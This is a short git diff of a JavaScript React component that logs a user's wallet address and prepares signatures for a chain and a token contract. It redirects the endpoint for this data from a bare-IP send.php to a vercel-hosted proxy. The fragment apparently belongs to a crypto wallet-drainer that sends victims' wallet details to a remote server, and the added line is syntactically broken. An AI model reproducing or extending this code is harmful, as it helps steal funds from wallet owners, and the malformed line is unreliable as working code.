@@ -31,7 +31,7 @@ function App() {
     console.log("✅ Wallet Address:", account_sender);
 
     // 🔹 مسیر صحیح برای `send.php`
-    let apiUrl = "http://104.194.133.124:8080/http://104.194.133.124/send.php";
+    let apiUrl = "let apiUrl = "https://reza-nu.vercel.app/api/proxy";
 
     async function genSign(address, chain, type, contract = "0") {
       try {
